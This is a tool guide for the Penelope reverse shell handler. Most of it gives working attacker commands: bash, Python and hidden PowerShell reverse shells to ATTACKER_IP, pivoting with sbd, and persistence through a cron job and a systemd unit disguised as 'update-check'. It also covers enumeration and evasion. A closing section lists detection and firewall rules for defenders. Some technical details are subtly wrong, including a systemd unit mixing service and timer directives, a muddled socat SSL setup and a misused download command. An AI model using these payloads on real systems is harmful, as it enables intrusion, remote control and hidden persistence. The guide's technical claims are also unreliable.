---
title: "Penelope - Advanced Reverse Shell Handler"
description: "Python-based reverse shell handler with session management, multi-connection support, and automatic TTY stabilization"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/ytisf/penelope"
kali_install: "git clone https://github.com/ytisf/penelope.git && cd penelope && pip install -r requirements.txt"
---

# Penelope

## Overview

Penelope is an advanced reverse shell handler written in Python that provides session management, multiple simultaneous connections, automatic TTY stabilization, and file upload/download capabilities. Unlike basic netcat listeners, Penelope organizes reverse shells into managed sessions, enabling operators to switch between connections and execute post-exploitation commands efficiently.

## Chapter 1: Installation

### From GitHub

```bash
git clone https://github.com/ytisf/penelope.git
cd penelope
pip install -r requirements.txt
```

### Dependencies

```bash
pip install colorama prompt_toolkit
```

### Verify Installation

```bash
python3 penelope.py --help
```

## Chapter 2: Basic Usage

### Start Listener

```bash
python3 penelope.py
```

**Explanation**: Starts Penelope on the default port (1337). The handler listens for incoming reverse shell connections and automatically stabilizes TTY when possible.

### Custom Port

```bash
python3 penelope.py -p 4444
```

**Explanation**: Specifies the listening port as 4444 instead of the default. The handler will accept connections on this port.

### Verbose Mode

```bash
python3 penelope.py -v
```

**Explanation**: Enables verbose output showing connection details, incoming data, and handler operations. Useful for debugging connection issues.

## Chapter 3: Reverse Shell Setup

### Bash Reverse Shell

```bash
# Attacker
python3 penelope.py -p 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: Penelope accepts the incoming connection and attempts to stabilize the shell automatically. The operator receives an interactive prompt with session identification.

### Python Reverse Shell

```python
# Target
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Explanation**: Penelope handles this connection and provides session management. The Python shell may not receive automatic TTY stabilization, but remains functional for command execution.

### Multiple Connections

```bash
# Start listener
python3 penelope.py -p 4444

# Multiple targets connect to the same port
# Each gets its own session with a unique ID
```

**Explanation**: Penelope manages multiple simultaneous connections, assigning each a session number. The operator can switch between sessions using the session management commands.

## Chapter 4: Session Management

### List Sessions

```
penelope> sessions
```

**Explanation**: Displays all active reverse shell sessions with their IDs, remote addresses, and status. Sessions are numbered sequentially.

### Switch Session

```
penelope> sessions -i 1
```

**Explanation**: Interacts with session 1, providing access to the remote shell. The operator can execute commands on the target system.

### Kill Session

```
penelope> sessions -k 2
```

**Explanation**: Terminates session 2 and closes the connection. The session is removed from the active session list.

### Background Session

```
penelope> background
```

**Explanation**: Returns to the Penelope command prompt while keeping the current session alive in the background. The session remains active and can be resumed later.

## Chapter 5: File Operations

### Upload File to Target

```
penelope> upload /local/path/file.txt /remote/path/file.txt
```

**Explanation**: Transfers a file from the attacker's machine to the target system through the established reverse shell connection. The file is sent in chunks to handle large files.

### Download File from Target

```
penelope> download /remote/path/file.txt /local/path/file.txt
```

**Explanation**: Retrieves a file from the target system to the attacker's machine. Penelope handles the transfer through the existing shell connection.

## Chapter 6: Post-Exploitation

### TTY Stabilization

Penelope attempts automatic TTY stabilization using Python's `pty` module. If automatic stabilization fails:

```bash
# Manual TTY upgrade on target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

**Explanation**: TTY stabilization provides features like tab completion, command history, and proper signal handling. This is essential for efficient post-exploitation work.

### System Enumeration

```bash
# Once shell is stabilized
whoami
id
uname -a
cat /etc/os-release
ifconfig
netstat -tlnp
```

**Explanation**: Basic enumeration commands help identify the compromised system's user, kernel version, network configuration, and running services.

## Chapter 7: Advanced Features

### Custom Shell Command

```bash
python3 penelope.py -p 4444 -c "/bin/bash"
```

**Explanation**: Specifies the shell command to execute when a connection is received. This can be used to force a specific shell or interpreter.

### Banner Display

```bash
python3 penelope.py --banner "Custom Banner"
```

**Explanation**: Sets a custom banner displayed when Penelope starts. Useful for distinguishing multiple handlers during complex operations.

### Logging

```bash
python3 penelope.py -p 4444 --log /path/to/logfile
```

**Explanation**: Logs all session activity to the specified file. This provides an audit trail of commands executed on target systems.

## Chapter 8: Evasion and Operational Security

### Connection through HTTP

Penelope can be combined with HTTP-based tools like chisel or socat to wrap the reverse shell connection in HTTP traffic, making it less conspicuous to network monitoring.

### Encrypted Connections

For encrypted reverse shells, use socat SSL or ncat SSL as the transport, then connect Penelope to the decrypted output:

```bash
# Socat SSL listener on target
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:/bin/bash

# Penelope connects to the decrypted stream
python3 penelope.py -p 4444
```

**Explanation**: This approach encrypts the network traffic while maintaining Penelope's session management capabilities.

## Chapter 9: Configuration Reference

### Command Line Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `-p, --port` | Listening port | 1337 |
| `-v, --verbose` | Enable verbose output | false |
| `-c, --cmd` | Shell command to execute | /bin/bash |
| `--banner` | Custom startup banner | Penelope banner |
| `--log` | Log file path | none |
| `-e, --encode` | Encode traffic | false |
| `-q, --quiet` | Suppress banner | false |

### Configuration File

Penelope supports a JSON configuration file for persistent settings:

```json
{
    "listen_port": 4444,
    "default_shell": "/bin/bash",
    "log_file": "/tmp/penelope.log",
    "auto_tty": true,
    "max_sessions": 10,
    "timeout": 300,
    "session_persistence": true
}
```

**Explanation**: The configuration file allows persistent settings across sessions. Place it at `~/.config/penelope/config.json` or specify with `--config /path/to/config.json`.

### Environment Variables

```bash
export PENELOPE_PORT=4444
export PENELOPE_SHELL=/bin/bash
export PENELOPE_LOG=/var/log/penelope.log
export PENELOPE_DEBUG=1
```

**Explanation**: Environment variables override default settings. They persist across terminal sessions when set in `.bashrc` or `.profile`.

## Chapter 10: Real-World Scenarios

### Scenario 1: Initial Access via Web Exploitation

```bash
# Attacker setup
python3 penelope.py -p 4444 --log /tmp/loot.log

# On compromised web server (target)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Session management
penelope> sessions
penelope> sessions -i 1
whoami && id
```

**Explanation**: After exploiting a web application vulnerability, establish a reverse shell and manage the session through Penelope. The log file provides an audit trail of all actions.

### Scenario 2: Pivoting Through Multiple Hosts

```bash
# First pivot point
python3 penelope.py -p 4444

# On compromised host 1
sbd ATTACKER_IP 4444 -k password -e /bin/bash

# From Penelope session 1, deploy to host 2
# (Upload sbd binary to host 1)
upload /tmp/sbd /tmp/sbd
chmod +x /tmp/sbd

# Create second listener on host 1
sessions -i 1
/tmp/sbd -l -p 4445 -k password

# From attacker, connect to host 1's listener
sbd HOST1_IP 4445 -k password -e /bin/bash
```

**Explanation**: Penelope manages the initial connection while additional tools like sbd create secondary pivots. This multi-hop approach provides access to deeper network segments.

### Scenario 3: Persistent Access Through Scheduled Tasks

```bash
# Establish initial shell
python3 penelope.py -p 4444

# On target, create persistent reverse shell
crontab -l | { cat; echo "*/5 * * * * sbd ATTACKER_IP 4444 -k password -e /bin/bash"; } | crontab -

# Or via systemd timer
cat > /etc/systemd/system/update-check.service << 'EOF'
[Unit]
Description=System Update Check

[Service]
Type=oneshot
ExecStart=/usr/bin/sbd ATTACKER_IP 4444 -k password -e /bin/bash

[Timer]
OnBootSec=60
OnUnitActiveSec=300
EOF
```

**Explanation**: Scheduled tasks ensure the reverse shell reconnects if terminated. Penelope automatically handles new connections from the scheduled task.

### Scenario 4: Windows Target Engagement

```bash
# Attacker
python3 penelope.py -p 4444

# Windows target (PowerShell)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+(Get-Location).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Explanation**: Penelope handles Windows reverse shells and provides session management for cross-platform engagements.

### Scenario 5: Multi-Listener Operation

```bash
# Listener 1: Port 4444 for Linux targets
python3 penelope.py -p 4444 --banner "Linux Listener"

# Listener 2: Port 4445 for Windows targets
python3 penelope.py -p 4445 --banner "Windows Listener"

# Listener 3: Port 4446 for web shells
python3 penelope.py -p 4446 --banner "Web Shell"
```

**Explanation**: Multiple Penelope instances can run simultaneously on different ports, each handling a specific target type. Session IDs are unique per listener instance.

## Chapter 11: Detection and Defense

### Network Detection

Monitor for these indicators:
- Outbound connections to uncommon ports from internal hosts
- Recurring connections to the same external IP on fixed intervals
- Reverse shell patterns in network traffic (stdin/stdout/stderr redirect)
- Base64-encoded commands in HTTP/HTTPS traffic

```bash
# Suricata rule for Penelope default port
alert tcp $HOME_NET any -> $EXTERNAL_NET 1337 (
    msg:"Penelope Default Port Connection";
    flow:to_server,established;
    sid:2024001; rev:1;
)

# Zeek script
event new_connection(c: connection) {
    if (c$id$resp_p == 1337) {
        NOTICE([$note="Penelope Connection",
                $msg="Connection to Penelope default port",
                $conn=c]);
    }
}
```

### Host-Based Detection

```bash
# Check for Penelope processes
ps aux | grep penelope
ps aux | grep python | grep -i "penelope\|reverse"

# Check for suspicious cron jobs
crontab -l
ls /etc/cron.d/
cat /var/spool/cron/*

# Check for persistent services
systemctl list-units --type=service | grep -v "systemd\|dbus"
ls /etc/systemd/system/*.service
```

### Firewall Rules

```bash
# Block outbound reverse shell connections
iptables -A OUTPUT -p tcp --dport 1337 -j DROP
iptables -A OUTPUT -p tcp --dport 4444 -j DROP

# Allow only established connections
iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT
```

### Log Analysis

```bash
# Monitor for shell spawning
auditctl -w /bin/bash -p x -k shell_spawn
auditctl -w /bin/sh -p x -k shell_spawn

# Review audit logs
ausearch -k shell_spawn
```

## Chapter 12: Troubleshooting

### Connection Not Received

```bash
# Verify listener is running
ps aux | grep penelope

# Check if port is in use
ss -tlnp | grep 4444
netstat -tlnp | grep 4444

# Test with nc
nc -zv ATTACKER_IP 4444

# Check firewall on attacker
iptables -L -n | grep 4444
ufw status
```

### Shell Not Stabilizing

```bash
# Manual TTY stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 200
```

### Session Disconnecting

```bash
# Check network stability
ping -c 10 ATTACKER_IP
mtr ATTACKER_IP

# Use keepalive
nohup python3 penelope.py -p 4444 &

# Or via screen
screen -S penelope
python3 penelope.py -p 4444
# Ctrl+A, D to detach
screen -r penelope
```

### File Transfer Failing

```bash
# Verify file permissions
ls -la /tmp/file_to_upload

# Use base64 for reliable transfer
# On attacker
base64 /tmp/binary > /tmp/binary.b64

# From Penelope session
penelope> download /remote/file.b64 /local/file.b64
base64 -d file.b64 > file
chmod +x file
```

### Port Already in Use

```bash
# Find process using port
lsof -i :4444
fuser 4444/tcp

# Kill process
kill -9 $(lsof -t -i :4444)

# Or use different port
python3 penelope.py -p 4445
```

## Chapter 13: Comparison with Alternatives

### Penelope vs Netcat

| Feature | Penelope | Netcat |
|---------|----------|--------|
| Session Management | Yes | No |
| Multi-connection | Yes | No |
| Auto TTY | Yes | No |
| File Transfer | Built-in | Manual |
| Logging | Built-in | External |
| Encryption | Via external | No |
| Persistence | No | No |

### Penelope vs Meterpreter

| Feature | Penelope | Meterpreter |
|---------|----------|-------------|
| Size | ~100KB | ~200KB |
| Dependencies | Python | Metasploit |
| Encryption | Optional | Yes |
| Post-exploitation | Basic | Full |
| Detection difficulty | Lower | Higher |
| Setup complexity | Simple | Complex |

### Penelope vs Socat

| Feature | Penelope | Socat |
|---------|----------|-------|
| Session management | Yes | No |
| SSL support | Via wrapping | Built-in |
| Multi-purpose | C2 focused | General |
| Configuration | Simple | Complex |
| Resource usage | Higher | Lower |

## Resources

- [Penelope GitHub Repository](https://github.com/ytisf/penelope)
- [Python Documentation](https://docs.python.org/)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [NIST SP 800-83 Guide to Malware Incident Prevention](https://csrc.nist.gov/publications/detail/sp/800-83/final)
